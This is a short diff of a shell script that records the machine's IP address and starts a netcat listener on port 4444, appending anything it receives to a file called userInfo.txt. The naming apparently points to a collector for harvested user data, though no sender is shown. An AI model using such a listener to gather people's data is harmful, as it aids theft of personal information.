@@ -1,6 +1,3 @@
 hostname -I > ipaddress
-if [ ! -f "userInfo" ]; then
-touch userInfo.txt
-fi
+sudo touch userInfo.txt
 sudo nc -lnv $(cat ipaddress) 4444 >> userInfo.txt
-
